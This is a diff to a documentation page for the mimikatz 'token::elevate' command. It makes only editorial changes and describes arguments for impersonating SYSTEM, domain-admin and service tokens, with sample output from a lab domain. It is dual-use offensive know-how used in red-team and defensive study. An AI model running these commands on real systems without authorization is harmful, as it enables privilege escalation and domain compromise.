@@ -1,6 +1,6 @@
 # elevate
 
-`token::elevate` can be used to impersonate a token. By default it will elevate permissions to `NT AUTHORITY\SYSTEM`. It has the following command line arguments:
+Impersonate a token. By default it will elevate permissions to `NT AUTHORITY\SYSTEM`. It has the following command line arguments:
 
 * `/process`: Impersonate the token of the running process
 * `/user`: Impersonate the token of the specified user
@@ -10,7 +10,7 @@
 * `/localservice`: `NT AUTHORITY\LOCAL SERVICE` token impersonation
 * `/networkservice`: `NT AUTHORITY\NETWORK SERVICE` token impersonation
 
-```
+```text
 mimikatz # token::elevate
 Token Id  : 0
 User name :
@@ -22,7 +22,7 @@ SID name  : NT AUTHORITY\SYSTEM
  * Thread Token  : {0;000003e7} 0 D 62721950    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,31p)       Impersonation (Delegation)
 ```
 
-```
+```text
 mimikatz # token::elevate /domainadmin
 Token Id  : 0
 User name :
@@ -35,3 +35,4 @@ SID name  : hacklab\Domain Admins
  * Thread Token  : {0;0007212c} 2 D 137785083   hacklab\Administrator   S-1-5-21-2725560159-1428537199-2260736313-500
 (29g,26p)       Impersonation (Delegation)
 ```
+
